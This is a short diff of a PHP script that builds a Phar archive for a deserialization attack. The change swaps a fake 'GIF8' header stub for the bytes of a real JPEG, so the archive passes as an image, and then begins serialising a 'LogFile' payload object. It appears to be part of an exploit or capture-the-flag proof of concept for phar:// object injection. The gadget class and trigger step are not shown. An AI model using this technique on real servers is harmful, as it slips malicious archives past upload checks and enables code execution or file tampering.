@@ -11,7 +11,7 @@ class LogFile
 //Create the Phar Archice
 $phar = new \Phar("test.phar");
 $phar->startBuffering();
-$phar->setStub("GIF8;<?php __HALT_COMPILER(); ?>");
+$phar->setStub(file_get_contents('image.jpg') . "<?php __HALT_COMPILER(); ?>");
 
 //Begin of serialization
 $payload = new LogFile();
